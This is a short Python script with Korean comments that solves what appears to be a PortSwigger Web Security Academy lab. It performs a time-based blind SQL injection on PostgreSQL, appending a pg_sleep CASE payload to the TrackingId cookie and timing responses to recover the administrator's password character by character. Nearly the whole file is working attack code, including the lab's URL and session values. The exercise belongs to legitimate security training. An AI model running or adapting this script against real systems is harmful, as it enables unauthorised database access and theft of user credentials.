import requests
import string
import time

# Time-based Blind SQLi
# DB: PostgreSQL
url = "https://0a4900ab04f08c3c83967432002e0075.web-security-academy.net/"
tracking_id = "P4XYv8CCTUZMKTTI"
session_cookie = "vaKFrhHlj17oqbonufKFWDw2V0Ltbqvf"
username = "administrator"
password_length = 20

# 탐색할 문자 목록 (a-z, 0-9)
charset = string.ascii_lowercase + string.digits

# 판단 시간 / 10초
time_threshold = 10

def find_password():
    password = ""
    for i in range(1, password_length + 1):  # 1 ~ 20까지 순회 (비밀번호 20자리)
        for char in charset:
            # Time-based Blind SQL Injection 페이로드
            payload = f"'%3BSELECT+CASE+WHEN+(username='{username}'+AND+SUBSTRING(password,{i},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
            # payload = f"'; SELECT CASE WHEN (username='{username}' AND SUBSTRING(password,{i},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END--"
            cookies = {'TrackingId': tracking_id + payload, 'session': session_cookie}
            
            # 서버 응답 시간 측정
            start_time = time.time()
            response = requests.get(url, cookies=cookies)
            end_time = time.time()
            
            # 응답 시간이 10초 이상이면 참으로 판단
            if end_time - start_time >= time_threshold:
                password += char
                print(f"현재까지 찾은 비밀번호: {password}")
                break

    return password

if __name__ == "__main__":
    found_password = find_password()
    print(f"완전한 비밀번호: {found_password}")
